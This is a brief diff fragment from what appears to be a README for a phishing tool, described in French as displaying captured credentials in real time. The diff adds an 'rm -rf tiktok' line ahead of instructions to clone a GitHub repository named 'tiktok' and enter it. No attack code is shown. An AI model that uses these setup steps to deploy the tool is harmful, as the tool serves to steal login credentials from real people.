@@ -13,7 +13,7 @@ Outil de phishing avancé avec affichage en temps réel des identifiants captur�
    
    
 
-
+rm -rf tiktok
    git clone https://github.com/Samsmis01/tiktok.git
    
  cd tiktok
